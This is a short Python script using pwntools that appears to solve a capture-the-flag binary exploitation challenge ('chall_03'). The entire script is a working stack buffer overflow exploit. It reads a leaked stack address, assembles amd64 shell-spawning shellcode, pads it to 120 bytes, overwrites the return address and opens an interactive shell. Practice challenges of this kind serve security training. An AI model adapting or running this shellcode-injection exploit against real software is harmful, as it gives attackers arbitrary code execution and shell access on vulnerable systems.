from pwn import *
def main():
	p = process("./chall_03")
	print(p.recv())
	p.sendline()
	addr = p.recv().decode().split("0x")[1]
	context.arch = "amd64"
	payload = asm(shellcraft.amd64.sh()) 
	payload += ((120 - len(payload)) * chr(int("00", 16)).encode())
	payload += p64(int(addr, 16))
	print(payload)
	p.sendline(payload)
	p.interactive()
main()
